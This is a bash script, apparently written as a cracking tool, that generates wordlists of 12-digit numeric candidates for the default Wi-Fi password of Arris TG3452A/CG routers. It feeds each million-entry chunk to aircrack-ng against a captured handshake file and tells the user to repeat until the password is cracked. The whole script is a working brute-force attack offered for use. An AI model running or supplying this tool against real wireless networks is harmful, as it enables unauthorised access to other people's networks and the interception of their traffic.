#!/bin/bash



echo ▄▀█ █▀█ █▀█ █ █▀ █▀▀ █▀█ ▄▀█ █▀▀ █▄▀ ▄▄ █▄░█ █▀▀
echo █▀█ █▀▄ █▀▄ █ ▄█ █▄▄ █▀▄ █▀█ █▄▄ █░█ ░░ █░▀█ █▄█
 
                                                                   


                                    

#Generate 1 million possible default passwords for Arris TG3452A/CG 
#to use with half handshake hash capture.
#Repeat until cracked. This model uses a 12 digit numeric default password.




# Define the range of 12-digit numbers
start=000000000000
end=999999999999

# Define the number of lines per output file (1 million lines)
lines_per_file=1000000

# Calculate the total number of files needed
total_files=$(( (end - start + 1) / lines_per_file ))

# Prompt the user to specify the path to the target file
read -p "Enter the path to the target file for aircrack-ng: " target_file

# Validate that aircrack-ng is installed
if ! command -v aircrack-ng &>/dev/null; then
  echo "aircrack-ng is not installed. Please install it and try again."
  exit 1
fi

# Prompt the user to select an output file number
echo "Total files available: $total_files"
read -p "Select an output file number (1 to $total_files): " file_number

# Validate user input
if (( file_number < 1 || file_number > total_files )); then
  echo "Invalid file number. Please select a number between 1 and $total_files."
  exit 1
fi

# Calculate the starting and ending points for the selected output file
start_range=$((start + (file_number - 1) * lines_per_file + 1))
end_range=$((start_range + lines_per_file - 1))

# Generate the numbers and write them to the selected output file
output_file="numbers_file$file_number.txt"

for ((i = start_range; i <= end_range; i++)); do
  printf "%012d\n" "$i"
done > "$output_file"

echo "File $output_file created with $lines_per_file lines."

# Use aircrack-ng to search for a match in the target file
echo "Searching for a match in $target_file using aircrack-ng..."
aircrack-ng -w "$output_file" "$target_file"

echo "Search completed."
